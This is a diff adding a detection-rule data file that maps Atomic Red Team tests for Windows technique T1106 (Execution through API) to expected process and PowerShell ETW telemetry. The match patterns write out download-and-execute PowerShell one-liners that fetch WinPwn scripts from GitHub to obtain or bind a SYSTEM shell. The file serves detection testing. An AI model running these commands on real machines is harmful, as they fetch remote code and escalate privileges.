@@ -1,0 +1,21 @@
+T1106,windows,99be2089,Execution through API - CreateProcess
+ARG,source_file,PathToAtomicsFolder\T1106\src\CreateProcess.cs
+ARG,output_file,%tmp%\T1106.exe
+_E_,Process,cmdline*=.*csc.exe /out:.*T1106.exe /target:exe .*T1106.*src.*CreateProcess.cs
+_E_,Process,cmdline~=T1106.exe
+
+T1106,windows,ce4e76e6,WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')
+
+T1106,windows,7ec5b74e,WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')
+
+T1106,windows,e1f93a06,WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
+
